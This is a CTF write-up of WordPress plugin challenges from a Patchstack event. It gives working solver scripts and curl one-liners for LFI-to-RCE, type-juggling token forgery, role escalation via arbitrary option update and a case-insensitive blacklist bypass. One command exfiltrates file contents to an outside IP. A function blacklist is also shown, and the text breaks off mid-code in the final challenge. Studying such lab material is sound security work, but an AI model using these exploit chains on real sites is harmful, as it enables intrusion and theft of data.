---
id: 1a348583-e65d-80e8-9ea1-fdb8caf29843
title: Patchstack Alliance CTF S02E01 - WordCamp Asia
created_time: 2025-02-23T13:15:00.000Z
last_edited_time: 2025-05-22T08:00:00.000Z
cover_image: ./imgs/ctf-asia_Iv836woO.jpg
categories:
  - wordpress
verification:
  state: unverified
  verified_by: null
  date: null
page: Patchstack Alliance CTF S02E01 - WordCamp Asia
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/ctf-asia_Iv836woO.jpg

---

Last weekend, I participated in the Patchstack WCUS CTF and solved all the WordPress challenges. Here's my write-up for each challenge from the Patchstack WCUS CTF 2025.

# **A Nice Block**

| Solves | 20 |
| ------ | -- |

Description

    I like the new Gutemberg editor, so I just installed a plugin with beautiful blocks addons. That's a great plugin that perfectly matches my design needs, I don't think it could cause a security issue, right?

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/736f5211-8c00-4e4f-9e48-c22e22fa0847/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QUXAPDVI%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141357Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQD7WaaVB8y2G2MU4XUvtY4V%2BQHnHoO%2F3TrXEtnCQm35qgIhAJZlm8Cr4qM5W%2B1%2BD7bXloQwK%2BObtfv4mNvVFdhLLnezKogECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxVqGkqtX0PG2S01uoq3AM6%2BQEFBeo1pkzdfTMOaP5jCQDoFAzQwPLWs0%2F3vX22%2FszUJt3MmJn0jFivmoamncCf70ynbXYZ6%2FHVbfl61907le3UHQKPK5avv0myLGbizMNs0esbsD3ix2shSF3zCCc9syt0uf2xiS%2FzP8Sc8JpWmfTkcodgFy44k9zdpMHwBf8KIYZfyCNaXfljCv0ffLPNBrmqPgeUwvkJ75L9q2V6FHnxWJFBRz%2BPiswF9XEM0eJ%2FUZ3wttWXrWuvu%2FGn6hfksij6%2BbYYU68pdmahwIK9yzcPBVAYZiFmS%2FLwXI7HsPRsrh6YRj7evObtfSQHzQFSqXZX5rrEESfsDR6161G18EejommyVBmRKHrm26UjTcxR%2BvOHVAqdUj8WtaJir8jLQLElU8i%2B%2FNhe%2FIP2Ui7E9De9niJ%2FEZH0gYZZlfzPGlPfvUZs2WEkl6jpgWQwImEDJd4t46Bc138nABd2HAcNtv3GbuAm0FfTfIsBYXN8ItIA5cggzN%2BUiTlbpXAdv72JKVpUhMIIAom7W2n4cOZfu5DzpD9EN8wEKe544iiotB1Cs6Xs0vYy1zVPceioY5I1Q3UVzhtRzXTtERU6ZHxZrdOmROhR9b1rTFPk5zpQiFvxNg6mmfp76HkWjzC48sHBBjqkAR1zLIV7zv4cli2xI%2FjezOH%2FTRSvwLfkr3H8jrXPR%2FSm%2FYXbtbjbUzLQeufBxFWU7acgb%2FSsVUq3zZpY6zjMUO7Fx7rP7uf%2F9rYWPtSP%2B9EaFy%2FpGsOP5SXPWdu7iejBgllyuHL6RoY7uFBUZGWmWJHWvBStb5UUSs6o8ed%2Fi9OEAFQXH1K545R%2FnAZL4Hix5PW9acj%2FZfdKt28YyOpGe8FJgnYc&X-Amz-Signature=6755b2096f4feb2d0477f63c8b341efb65f3ee49b020acad76214536c61f46db&X-Amz-SignedHeaders=host&x-id=GetObject)

References

    - [https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly](https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly)

    - [https://hackmd.io/@Solderet/AngstromCTF2023#Filestore---Web](https://hackmd.io/@Solderet/AngstromCTF2023#Filestore---Web)

***

Using Semgrep and my Semgrep custom rules, we can easily identify the vulnerable code parts. Here are the Semgrep results:

![](./imgs/image_40dZWs5o.png)

It’s Local File Inclusion, and if it’s using dockerized PHP, it can be easily exploited using this technique: <https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly>

## Solver

```bash
curl "http://52.77.81.199:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?tab=../../../../../../../../../../usr/local/lib/php/peclcmd.php&+run-tests+-i+-r\"system(hex2bin('$(echo "curl 77.37.47.226:4444 -d \"`cat /*`\"" | hexdump -v -e '/1 "%02x"' | tr -d '\n')'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt"
```

### Flag

![](./imgs/image_gT22iTmO.png)

# **Patchstack Scheduler Pro**

| Solves | 18 |
| ------ | -- |

Description

    Patchstack needed to update their Blog content and asked a freelancer to make a plugin for scheduling their newest advisories. It has not been tested yet can you check it for us?

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/db2d4cd5-920a-47fb-82d9-c3fc43e239d0/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664HTC63ZF%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141403Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQDSNItlDP8ae7pcDpeHtTF%2BhPF4yILiXhBvViIMsbxDkAIhAKwKUXkXKJOyDAAYNxvlGp%2BjMXzn9qN0L%2BipeAqt5LB5KogECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgzvHNo2rLJvdi%2BwBcYq3APtai07HvOho6dvWSC1HYqOdBAyzPHxWXtm9Ya9P0l4jH2U3UwxJVttd1%2BukQrwXXJF6POIBAhcc6C%2Bg3SjIlBCoOmCUKquJkwB%2BnJ0KF99YLM6qxlmrRsT8AmI9vdZ64KDmDQ8ebbStAoQOonqieVsxgsW58IdR97j4fttjF8lMekIARydSyqd1q7bJwvYnOVXbxO1K%2BLU8hXFrtbvpB71%2FYCzCuwGCBH%2BJiZpTP0Mhx9cxV1UL7Cq9EUZqq4FvRY%2BvFFlbyvMeBBA2b%2F1WorvTlQbaclS8qbU0t6j15NBrunUsRU42RbislgDkQ1QjTBCQ%2Bd8h6FrQmColioElC1tuEG9jpVMywRd%2B2XYdvlr1OLblJXte14wGE7a4L%2Fbp0wrPZiC3CJE0NR8T%2FJy%2BixhySHeCbzDvvlk9gq015l%2BoLn0xrvo5RUh8O6PfVlACPGPBnZhKTm4vkptZFahQnhBboPhznvLX2Ati0kE88ZchWW4nri3XhW%2Bbh90BVXshyQv22hTR0A4P%2Bgy528KrzX%2BhQ5vqYNUVFyn%2BV4Om9VtBfKAeTE7r92HX6ASvbYB9g8QYWdlpGA7SNfTjcE7j2vEC2nJ5Z56%2BTS4KG2P4Y47vmt0sUJWVvGu%2FfDTOzCE8sHBBjqkAcP1cR1qvGmzFsCi4%2Bekd29R5dTVWM1Bs9JJh1Ti5xKyU7gcMNhDKqFRmrGc16siPJ9vyF%2B0bwCfpAeoTM%2BztvCHYMZYq7ijEu6a4AAF7%2BE32XgcPbICsnk%2BiLFkPrs7mUF0Qi1ir%2F0%2BUghPjNqxNw1okHSqAFsnblxI%2FpH%2FHEJ%2Bp8WhodmD6tN%2FBNoDv5xmvjYbzkICYGc3ZKKb8OR1h0mgBzkr&X-Amz-Signature=f570dd1f3fedb70aa30dfd72c8faf4bb448a15c2aca8f7187f43940b870dc0d1&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

This challenge is vulnerable to information disclosure, PHP type juggling, some encryption logic failures, and token tampering. Here is the order of exploitation:

*   First, exploit information disclosure to get the `api_token`.

*   Use PHP type juggling to bypass this check: `$data['encryption_key'] != $this->encryption_key`.

*   Reuse the UUID to decrypt and get the `encryption_key`:

    Related method:

          ```php
              private function get_encrypted_config() {
                  $config = array(
                      'status' => 'draft',
                      'permissions' => array(
                          'view' => true,
                          'edit' => false
                      ),
                      'encryption_key' => $this->encryption_key
                  );
                  
                  $uuid = substr($this->encryption_key, 0, 16);
                  $encrypted = openssl_encrypt(
                      json_encode($config),
                      'AES-256-CBC',
                      $uuid,
                      0,
                      $uuid
                  );
                  
                  return base64_encode($uuid . base64_decode($encrypted));
              }
          ```

*   Finally, use the `encryption_key` to tamper with the token so we can access the flag.

## Solver

poc.py

    ```python
    import httpx
    import asyncio
    import re
    import json
    import subprocess

    # URL = "http://172.26.119.33:9192/"
    URL = "http://52.77.81.199:9192/"
    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.AsyncClient(base_url=url)

        def wp_login(self, username: str, password: str) -> None:
            return self.c.post("/wp-login.php", data={
                "log": username,
                "pwd": password
            })
        def handle_preview_request(self, post_id):
            return self.c.get("/wp-admin/admin-ajax.php", params={
                "action": "patchstack_scheduler_preview",
                "post_id": post_id
            })
        def patchstack_scheduler_compare(self, api_token):
            return self.c.post("/wp-admin/admin-ajax.php?action=patchstack_scheduler_compare", json={
                "api_token": api_token,
                "encryption_key": True,
                "revision_data": {
                    "post_status": "draft",
                }
            })
        def handle_settings_request(self, config):
            return self.c.post("/wp-admin/admin-ajax.php?action=patchstack_scheduler_settings", json={
                "config": config
            })
    class API(BaseAPI):
        def encrypt_config(self, config: dict, encryption_key: str) -> str:
            # Call the PHP script to encrypt the config
            result = subprocess.run(
                ['php', 'decrypt.php', 'encrypt', json.dumps(config), encryption_key],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                raise Exception("Error encrypting config: " + result.stderr)
            
            return result.stdout.strip()

        def decode_encrypted_config(self, encrypted_config: str) -> dict:
            # Call the PHP script to decrypt the config
            result = subprocess.run(
                ['php', 'decrypt.php', 'decrypt', encrypted_config],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                raise Exception("Error decrypting config: " + result.stderr)
            
            return json.loads(result.stdout)

    async def main():
        api = API()
        token = ""
        for i in range(100):
            res = await api.handle_preview_request(i)
            if "API Token" in res.text:
                token = re.findall(r"API Token: (.*?)\"", res.text)[0]
                break
        res = await api.patchstack_scheduler_compare(token)
        encrypted_config_b64 = res.json()['data']['encrypted_config']
        
        # Decode the encrypted config using PHP
        decrypted_config = api.decode_encrypted_config(encrypted_config_b64)
        encryption_key = decrypted_config["encryption_key"]

        # Example of encrypting a new config
        new_config = {
            'status': 'publish',
            'permissions': {
                'all': True,
            },
            "flag_access": True
        }
        encrypted_config = api.encrypt_config(new_config, encryption_key)
        print("Encrypted Config:", encrypted_config)

        res = await api.handle_settings_request(encrypted_config)
        print(res.text)

        
        

    if __name__ == "__main__":
        asyncio.run(main())

    ```

decrypt.php

    ```php
    <?php
    function encrypt_config($config, $encryption_key) {
        $uuid = substr($encryption_key, 0, 16);
        $encrypted = openssl_encrypt(
            json_encode($config),
            'AES-256-CBC',
            $encryption_key,
            0,
            $uuid
        );

        return base64_encode($uuid . base64_decode($encrypted));
    }

    function decrypt_config($encrypted_config) {
        $decoded_data = base64_decode($encrypted_config);
        $uuid = substr($decoded_data, 0, 16);
        $encrypted = substr($decoded_data, 16);
        
        $decrypted = openssl_decrypt(
            base64_encode($encrypted),
            'AES-256-CBC',
            $uuid,
            0,
            $uuid
        );

        return json_decode($decrypted, true);
    }

    if (isset($argv[1]) && isset($argv[2])) {
        $action = $argv[1];
        $data = $argv[2];
        $encryption_key = $argv[3];

        if ($action === 'encrypt') {
            $encrypted_config = encrypt_config(json_decode($data, true), $encryption_key);
            echo $encrypted_config;
        } elseif ($action === 'decrypt') {
            $decrypted_config = decrypt_config($data);
            echo json_encode($decrypted_config);
        }
    }
    ?>
    ```

### Flag

![](./imgs/image_uK380fdn.png)

# **Sup3rcustomiz3r**

| Solves | 11 |
| ------ | -- |

Description

    My friend is developing a cool plugin to help me customize my Login page, isn't that nice? So many stuff and options, I'm sure it's 100% safe to use...

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/61f45406-c096-4a5f-a60e-06f2548f7448/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46676LHU74Q%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141407Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIQCUTQ4zRrANeHd%2BiF3zQdzMmVlfQYRUJuIr%2FjaR6r9nBgIgfDr%2BoEjOyNEYkAJ492HAnH%2BFicSrVPKhHBjckKGTq8IqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDLXj%2Fq65S69n1I%2BiFircA2nju6gp74DIMhwERn2NA2Zyz8bLlSrTcAmA%2FeB%2FahwOCU6KQVlKbEu1AXasemVr2ErZ6HSd3qvqdWiAwhHSJBQh%2BD6XOJTGPd9lhqg6qSeVSd%2Bqgnkzbu%2FQClXYnThm%2FjPbTTZUmcH%2FUUb%2FNuUyoEUkVqiF3DqJ4L8o8ChToHOBRz7%2FAEFqV%2FA%2BZ2nWG1%2Fppc7cCe9D33uBYcY52DcodOGVUZtv4LvdBpeRk3VQX%2BOxpt87XYaUtZoYbCRXrpQp8x4pJSHzB2rto6QKysxfk21rmdrKDiHFA%2BlWiLNIdbP8eZasoIpYVD7BM4m9CwFWNBSTO6jeD3X8v1F0FxOSVXPNd0gEIsJL1O5JNbcZO4Vq3on7aBCO0Ow7C806xF1zfI6ZWARH4B8liW9jBjZRt4ywK5rTh3YQo%2FGJg3xSyStDs8h1%2BRCoV4zuS85dNDjfjfdXwdMp%2FdnJ%2Fdwnay5nDdI138y1%2BVGpXVD8T1vA%2F2AECSJVTWS%2B%2BfMbnqTtHgfkSOvVnA4M5%2FyUCqwQV71nYpuTxfm%2FtXIwqUGkySyV1tZx3GjeoOgywOWRcfiQr4JEfFTaQVy0DB4VlezDvVFJpn7YImt8nDQrpba%2FjtutHRtFAFMOlkTxROdDkQBWMLTxwcEGOqUBOGzWGObEZO7uIy29LR38mlYjEb4Huxj8kZkgc4caw4u91hkwcwn16HufLE8dnM1QfuhQc6uCuGT7FGgiIbbTj0DaWfJI%2F%2BomwoJU5rylKywn%2Fqt%2Fjoa0j8i1FjJLo6UWgg%2B59wkv14PLGykKEXjvzO6DPNltVZ644ta5a9sCU99bsjZ%2F1EKq6k8OV1i4tunMZCyuJmFqJKJjsP1Kv%2BYYZwITTDrT&X-Amz-Signature=13bc11b2b8c7d70ae7d2d2d6d55c59abdd8bfe7bde045d5a8b36e2198ee9d5d9&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we will exploit one vulnerability: arbitrary option update. The flag is stored in `patchstack_get_the_flag` and can be accessed via this unauthenticated AJAX action:

```php
add_action("wp_ajax_nopriv_patchstack_get_the_flag", "get_the_flag");

```

```php
function get_the_flag()
{
    $user = wp_get_current_user();
    $allowed_roles = ["administrator", "author", "contributor"];
    if (array_intersect($allowed_roles, $user->roles)) {
        $value = file_get_contents('/flag.txt');
        wp_send_json_success(["value" => $value]);
    } else {
        wp_send_json_error("Unauthorized");
    }
}

```

We need to have an administrator, author, or contributor role to view the flag.

First, we need to register using this `nopriv` AJAX action:

```php
add_action('wp_ajax_nopriv_login_register_user', array($this, 'login_register_user'));

```

```php
function login_register_user() {
    $username = sanitize_user($_POST['username']);
    $email = sanitize_email($_POST['email']);
    $password = $_POST['password'];

    if (empty($username) || empty($email) || empty($password)) {
        wp_send_json_error(array(
            'message' => 'All fields (username, email, password) are required.',
        ));
    }
    if (!is_email($email)) {
        wp_send_json_error(array(
            'message' => 'Invalid email address.',
        ));
    }
    if (username_exists($username) || email_exists($email)) {
        wp_send_json_error(array(
            'message' => 'Username or email already exists.',
        ));
    }

    $user_id = wp_create_user($username, $password, $email);
    update_option('default_role', 'subscriber');

    if (is_wp_error($user_id)) {
        wp_send_json_error(array(
            'message' => $user_id->get_error_message(),
        ));
    }

    wp_send_json_success(array(
        'message' => 'User registered successfully.',
        'user_id' => $user_id
    ));
}

```

Next, we can access this AJAX action that requires authentication:

```php
add_action('wp_ajax_login_customizer_set_option', array($this, 'set_option'));

```

```php
function set_option() {
    if (isset($_POST['_wpnonce']) && wp_verify_nonce(sanitize_text_field(wp_unslash($_POST['_wpnonce'])), 'login-customizer-admin')) {
        $op = sanitize_text_field($_POST['option']);
        $val = sanitize_text_field($_POST['value']);
        update_option($op, $val);
        wp_send_json_success('Option has been saved', 201);
    }
}

```

This AJAX action will update our user-supplied option, which means we can set the `default_role` option to, for example, "contributor" so we can read the flag in the `patchstack_get_the_flag` AJAX action. After setting the `default_role`, we can register a new user, and this time the role will be set as "contributor" because we set it before using the `default_role` option. Lastly, we get the flag in the `patchstack_get_the_flag` AJAX action.

## Solver

solver.py

    ```python
    import httpx
    import asyncio, re, random

    URL = "http://52.77.81.199:9193/"

    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.AsyncClient(base_url=url)

        def wp_login(self, username: str, password: str) -> None:
            return self.c.post("/wp-login.php", data={
                "log": username,
                "pwd": password
            })
        def login_register_user(self, username, email, password):
            return self.c.post("/wp-admin/admin-ajax.php?action=login_register_user", data={
                "username": username,
                "email": email,
                "password": password,
            }) 
        def login_customizer_set_option(self, nonce, option: str, value: str) -> None:
            return self.c.post("/wp-admin/admin-ajax.php?action=login_customizer_set_option", data={
                "option": option,
                "value": value,
                "_wpnonce": nonce
            })
        def patchstack_get_the_flag(self):
            return self.c.get("/wp-admin/admin-ajax.php?action=patchstack_get_the_flag")

    class API(BaseAPI):
        async def get_nonce(self):
            res = await self.c.get("/?preview=1")
            return re.findall("_ldAdminNounce = (.*?)\"", res.text)[0]

    async def main():
        api = API()
        username = "dimas"
        password = "dimas"
        res = await api.login_register_user(username, "dimas@dimas.com", password)
        print(res.text)
        res = await api.wp_login(username, password)
        nonce = await api.get_nonce()
        res = await api.login_customizer_set_option(nonce, "default_role", "contributor")
        print(res.text)
        randomtxt = random.randbytes(4).hex()
        username = username + randomtxt
        password = password + randomtxt
        api = API()
        res = await api.login_register_user(username, f"dimas{randomtxt}@dimas.com", password)
        print(res.text)
        res = await api.wp_login(username, password)
        res = await api.patchstack_get_the_flag()
        print(res.text)


    if __name__ == "__main__":
        asyncio.run(main())

    ```

### Flag

![](./imgs/image_TvJgIAwn.png)

# **Cool Templates**

| Solves | 11 |
| ------ | -- |

Description

    I had someone build me a plugin so I can send out some links with special footers. I'm sure the code is safe, right?

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/d616c041-db7e-44b7-95ce-2ec51d2d65d5/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VKK6U52Q%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141410Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJGMEQCIAkeKXy49fB1F5%2BzH3IEKA9JXZBSQ60%2Bt%2F3IuI1dVHkKAiAPRoiVtb20r%2FMFfdNr0CzoRXfSFwXo88gH7R2NU0BVJyqIBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM6qTTV706OX1IgpljKtwDVT0WZM5aw%2F8vP0qJ1B9xHXU8uJ4tyV%2BHkZcEZ3uG158LnWGaqLCgn6EN7Ft4lpDD1Rp%2BI%2FayCRvYTYlt9pkYD5WxjbIXvxXWgRZ36U3l8uJUdLwhJs7kPUc0AFixD7qk%2FJoxe8RfcClQglJpFKAyXBeGZbWXu%2B4siUOaUJbk2uk%2BUnmKAPyzIC9QQHtgMWJY1ww7qHsTBpYXNha9CCNS1BGiy0XecXYuMYGr4xbLOF4s3Z%2Fu5WO7LDiQCNZ3zhx%2FNEM%2FCkktGCZpfdVTZUg8G9cqgDG3fx7Xh8Fuiro5vdsh7pjMBbpSUXijp2M6k3%2FhKIaHtaB3dQYV6U4VGp1aCgZG8cY0vJcFMmYdM9GwpVQHTXryGhVntJRbf%2BM0LSjl9dPRU6AhXDuoNOOzItbe0AE%2BAewa8NBicXphKtrRL5OsCd33lHnNT0mgDQdUnWWZoBbvRwrWZGWvL4T0ut7a0iJJacdlP0tR06BGhEa1BuhdxOONp0%2F76KlxGL04uopxqZJzF%2FnPORUcy6q58Ie3BCV%2FC08NBrhHWJ%2BKx4I6flgE5rY8A17HD7D%2BnY2et0vQhsq2YjsI3GxtsBOzEB1qwCQQF5%2FwPL6x404qwHYnDhaE0h2%2B6Ais3JYHrnwwyfHBwQY6pgEPW0l8RRVdApF7ktldY1Q%2BFranySAzcDvdsXzk%2BIwlo22zp1XiME2wXvUUnj14cg5mXN%2FXLe1xjej4IcVq7EO%2FODb2jPoklmjLTG90JTypgCfY7CA9XWzD2EvhUSFGtKnHAiTT4zxNDP2YAMRr4KePdGETU8vOUcIZAqFjAbQU0PIwp%2Fmc1KHy4SISJAQsjDl82O6h87PuljR3YyLQgDSs4JTCJEnn&X-Amz-Signature=bd8302192894b056f363f93b89f2b1bd22b6b8fb7f266999ac00754dcea94d0c&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

There's a WAF that restricts many functions that can probably lead to RCE, but the regex is case-sensitive here:

```php
function add_custom_footer() {
    $blacklist = array("system", "passthru", "proc_open", "shell_exec", "include_once", "require", "require_once", "eval", "fopen",'fopen', 'tmpfile', 'bzopen', 'gzopen', 'chgrp', 'chmod', 'chown', 'copy', 'file_put_contents', 'lchgrp', 'lchown', 'link', 'mkdir', 'move_uploaded_file', 'rename', 'rmdir', 'symlink', 'tempnam', 'touch', 'unlink', 'imagepng', 'imagewbmp', 'image2wbmp', 'imagejpeg', 'imagexbm', 'imagegif', 'imagegd', 'imagegd2', 'iptcembed', 'ftp_get', 'ftp_nb_get', 'file_exists', 'file_get_contents', 'file', 'fileatime', 'filectime', 'filegroup', 'fileinode', 'filemtime', 'fileowner', 'fileperms', 'filesize', 'filetype', 'glob', 'is_dir', 'is_executable', 'is_file', 'is_link', 'is_readable', 'is_uploaded_file', 'is_writable', 'is_writeable', 'linkinfo', 'lstat', 'parse_ini_file', 'pathinfo', 'readfile', 'readlink', 'realpath', 'stat', 'gzfile', 'readgzfile', 'getimagesize', 'imagecreatefromgif', 'imagecreatefromjpeg', 'imagecreatefrompng', 'imagecreatefromwbmp', 'imagecreatefromxbm', 'imagecreatefromxpm', 'ftp_put', 'ftp_nb_put', 'exif_read_data', 'read_exif_data', 'exif_thumbnail', 'exif_imagetype', 'hash_file', 'hash_hmac_file', 'hash_update_file', 'md5_file', 'sha1_file', 'highlight_file', 'show_source', 'php_strip_whitespace', 'get_meta_tags', 'extract', 'parse_str', 'putenv', 'ini_set', 'mail', 'header', 'proc_nice', 'proc_terminate', 'proc_close', 'pfsockopen', 'fsockopen', 'apache_child_terminate', 'posix_kill', 'posix_mkfifo', 'posix_setpgid', 'posix_setsid', 'posix_setuid', 'phpinfo', 'posix_mkfifo', 'posix_getlogin', 'posix_ttyname', 'getenv', 'get_current_user', 'proc_get_status', 'get_cfg_var', 'disk_free_space', 'disk_total_space', 'diskfreespace', 'getcwd', 'getlastmo', 'getmygid', 'getmyinode', 'getmypid', 'getmyuid', 'create_function', 'exec', 'popen', 'proc_open', 'pcntl_exec');
    if (isset($_REQUEST['template']) && isset($_REQUEST['content'])) {
        $template = $_REQUEST['template'];
        $content = wp_unslash(urldecode(base64_decode($_REQUEST['content'])));
        if(preg_match('/^[a-zA-Z0-9]+$/', $template) && !in_array($template, $blacklist)) {
            $footer = $template($content);
            echo $footer;
        }
    }
}

add_action('wp_footer', 'add_custom_footer');

```

Because functions can be called case-insensitively, we can do something like this:

```php
SysTem("ls")
```

![](./imgs/image_JizWNzcQ.png)

And it will still call the `system` function.

## Solver

```php
curl "http://52.77.81.199:9122/?template=SyStEm&content=$(echo -n "cat /*" | base64 -w0)"
```

### Flag

![](./imgs/image_oSpxaLPn.png)

# **Blocked**

| Solves | 7 |
| ------ | - |

Description

    it's blocked, nothing to do here.

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/9ce18315-c512-4217-afd7-5776f9d39ad5/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4664I53EONI%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141411Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIQDWIGhXtQC9YITC2rkWhLipQqwahgYA1y3lpZc%2FXzn5DwIgNCYdb1oWW2%2BIqg%2FtojYTiKFOGYuE4N8mIlAaD2HU%2F5AqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDE%2BnOcfVzNP5QZ0jLyrcA0IQXFBbe91k1CSWf1UTn5zxRYQ%2FstAsE1o1K1Dtl7%2FEzRFO%2F1PkuS5Xbr4vFHBxqgy5SA6egPsUrUIpRBUETrs4tDCzNKemgKvIOouhh3b5KPnBkWLj%2BHfDWkWdTkIwx5MqXFdMx3DzrE4%2F6HKTjMiol%2FBtm%2FlXpTatGZes8Pj%2FyGPkJtey%2F9%2Fqg2DpgLE7cx%2FVW6GsqedbovWFkRf08iHklcV2HhdRCYGSqvVjAB%2FM9YRESDbhKeuC61bQaNe25L0kyZkW8aZb5Ch%2FNLxZExgDn0QKIvorxuqoRthKLlLvXjo59KyLD1PQjbhn1oGBYXxWZT0pRcWvDfQTSkVKgH0AR6Qa3c95qvrkEMD1%2BgyMCAnFajWdEM2%2F6bA0KmEZdwmIfRVoapYuhF4cJx%2FkIfiqnntOJGuYSyh2B%2B81rzoodXmhD2Rjsks4WAUGimgIZ1UT3geLheIlYLzWiixz7j9WD2SU%2FzADpTkedcntCcjsIRXHR9tHkB6HZ4Y36TE%2F1Nq4cwQH1o%2B2Diq3tFX1jj1JWXmFXiK3%2BLfmgeCK1sArTZ%2FR1oiAdpt3pvLGC0MsysmHTEymiBxRD1heTejtfnxyUYemESngfOveqLe9d9pz2vRzw0DGQJeF1faSMM%2FxwcEGOqUBCHzoXAKE6uF7kLcaMVb7mzGDL764XxgswAOpgO%2FTmRBFvgaiWdv8EVS6J6l00dfHPZnL2TFL1r6E9VkgY%2FGR7B5UzCQVGFyNZuUSbiNyCVnVTQIfBE36U0SxDgf8wKSN%2BGD321HWVqIR5QtF80wTob4mwedj0vSiwbUZ1OzgxXj61qSYJelm97uWncdn6MEa8%2FdA0Rfhvf2PfjNipETbK8KkPsMa&X-Amz-Signature=80bed61f9f7e66ce17d9273274380346831c80b367fcab93dd55ba3a7f4a741b&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

plugin

    ```php
    <?php

    /**
     *
     * @wordpress-plugin
     * Plugin Name:       Test Plugin
     * Plugin URI:        http://example.com/plugin-name-uri/
     * Description:       This is a short description of what the plugin does. It's displayed in the WordPress admin area.
     * Version:           1.0.0
     * Author:            Patchstack
     * Author URI:        http://example.com/
     * License:           GPL-2.0+
     * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
     * Text Domain:       test-plugin
     * Domain Path:       /languages
     */

    // If this file is called directly, abort.

    if ( ! defined( 'WPINC' ) ) {
    	die;
    }

    define( 'PLUGIN_NAME_PLUGIN_NAME', 'test-plugin' );
    define( 'PLUGIN_NAME_VERSION', '1.0.0' );
    define( 'PLUGIN_NAME_URL', plugin_dir_url( __FILE__ ) );
    define( 'PLUGIN_NAME_PATH', plugin_dir_path( __FILE__ ) );
    define( 'PLUGIN_NAME_BASE_DIR', plugin_dir_path( __FILE__ ) );
    define( 'PLUGIN_NAME_BASE_NAME', plugin_basename( __FILE__ ) );

    add_action("init", "set");
    add_action("rest_api_init", "register_endpoints");

    function set(){
        update_option("secretword_is_true", "anything");
    }

    function register_endpoints(){
        register_rest_route( 'test', '/upload/(?P<somevalue>\w+)', [
            'methods' => WP_Rest_Server::CREATABLE,
            'callback' => 'upload_something',
            'permission_callback' => 'check_request',
        ]);
    }

    function check_request( $request ) {
        $some_value = trim( strtolower( $request['somevalue'] ) );
        if( empty( $some_value ) ) {
           return false;
        }
     
        if( ! preg_match( '/^secretword_/i', $some_value) ) {
           return false;
        }
     
        if( $some_value == 'secretword_is_true' ) {
           return false;
        }
        return true;
    }

    function upload_something($request){
        $body = $request->get_json_params();
        $content = $body['content'];
        $name = $body['name'];
        $some_value = trim( strtolower( $request['somevalue'] ) );
        if(!get_option($some_value)){
            echo "blocked";
            exit(); 
        }

